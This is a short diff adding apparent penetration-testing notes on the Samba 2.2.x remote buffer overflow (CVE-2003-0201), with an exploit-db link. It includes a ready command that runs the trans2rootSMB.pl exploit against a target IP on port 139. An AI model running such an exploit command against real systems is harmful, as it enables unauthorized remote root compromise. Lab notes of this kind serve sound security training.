@@ -1,0 +1,5 @@
+Samba 2.2.x - Remote Buffer Overflow CVE-2003-0201
+
+https://www.exploit-db.com/exploits/7
+
+perl trans2rootSMB.pl -M B -p 139 -t linx86 -H IP -h 10.11.1.115
